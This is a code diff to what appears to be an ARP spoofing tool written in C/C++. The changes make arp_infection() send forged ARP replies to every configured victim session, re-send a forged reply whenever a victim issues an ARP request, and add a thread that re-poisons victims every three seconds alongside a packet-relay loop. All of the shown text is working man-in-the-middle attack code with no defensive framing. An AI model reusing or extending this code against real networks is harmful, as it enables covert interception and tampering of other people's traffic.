@@ -89,8 +89,11 @@ void get_mac(uint8_t * sender_mac, uint8_t * sender_ip) {
 	}
 }
 
-void arp_infection(session s) {
-	send_pkt(ip2mac[s.sender_ip], my_mac, ip2mac[s.sender_ip], (uint8_t *)&s.sender_ip, (uint8_t *)&s.target_ip, static_cast<uint16_t>(0x0200));
+void arp_infection() {
+	for(int i = 0; i < session_cnt; i++) {
+		session s = ip_vector[i];
+		send_pkt(ip2mac[s.sender_ip], my_mac, ip2mac[s.sender_ip], (uint8_t *)&s.sender_ip, (uint8_t *)&s.target_ip, static_cast<uint16_t>(0x0200));
+	}
 }
 
 void pkt_relay_recover(unsigned char *param, const struct pcap_pkthdr *header,const unsigned char *pkt_data)
@@ -105,7 +108,7 @@ void pkt_relay_recover(unsigned char *param, const struct pcap_pkthdr *header,co
 			else if(ethernet -> ether_type == htons(0x0806)) {
 				struct arp_header * arp = (struct arp_header *)(pkt_data + 14);
 				if((arp -> arp_op == htons(0x0001)) && (!memcmp(arp -> arp_tpa, (uint8_t*)&ip_vector[i].target_ip, 4))) {
-					arp_infection(ip_vector[i]);
+					send_pkt(ip2mac[ip_vector[i].sender_ip], my_mac, ip2mac[ip_vector[i].sender_ip], (uint8_t *)&ip_vector[i].sender_ip, (uint8_t *)&ip_vector[i].target_ip, static_cast<uint16_t>(0x0200));
 				}
 			}
 			break;
@@ -128,3 +131,16 @@ void add_to_num(char * address, uint8_t * ip) {
 	uint32_t tmp = inet_addr(address);
 	memcpy(ip, &tmp, 4);
 }
+
+void * infection_timer(void * arg) {
+	while(1) {
+		arp_infection();
+		sleep(3);
+	}
+}
+
+void * pkt_loop_thread(void * arg) {
+	pcap_loop(fp, 0, pkt_relay_recover, NULL);
+	return NULL;
+}
+
